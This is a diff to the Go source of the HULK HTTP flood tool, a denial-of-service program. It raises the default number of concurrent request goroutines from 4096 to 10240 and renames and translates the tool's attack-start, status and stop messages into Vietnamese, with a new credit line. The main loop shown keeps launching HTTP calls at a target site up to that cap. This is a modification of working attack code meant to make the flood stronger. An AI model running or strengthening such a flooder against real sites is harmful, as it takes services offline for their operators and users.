@@ -281,7 +281,7 @@ func main() {
 	t := os.Getenv("HULKMAXPROCS")
 	maxproc, err := strconv.Atoi(t)
 	if err != nil {
-		maxproc = 4096
+		maxproc = 10240
 	}
 
 	u, err := url.Parse(site)
@@ -291,7 +291,7 @@ func main() {
 	}
 
 	if version {
-		fmt.Println("Hulk", __version__)
+		fmt.Println("Bản cải tiến từ Đậu Đậu", __version__)
 		os.Exit(0)
 	}
 
@@ -311,18 +311,18 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("  -- Đã bắt đầu tấn công HULK --\n           Go!\n\n")
+		fmt.Println("  -- Đã bắt đầu tấn công  --\n           Go!\n\n")
 		ss := make(chan uint8, 8)
 		var (
 			err, sent int32
 		)
-		fmt.Println("    In use             |\tResp OK |\tGot err")
+		fmt.Println("    Đang sử dụng             |\tKết nối thành công |\tKết nối thất bại")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Printf("\r  %6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("\r  %6d trong số tối đa %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
 			}
 			switch <-ss {
 			case callExitOnErr:
@@ -335,8 +335,8 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r  %-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r  -- Đã kết thúc cuộc tấn công HULK --       \n\n\r")
+				fmt.Printf("\r  %-6d trong số tối đa %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Println("\r  -- Đã kết thúc cuộc tấn công --       \n\n\r")
 				os.Exit(0)
 			}
 		}
@@ -345,7 +345,7 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r\n  -- Bị gián đoạn bởi người dùng --        \n")
+	fmt.Println("\r\n  -- Người dùng đã dừng cuộc tấn công--        \n")
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
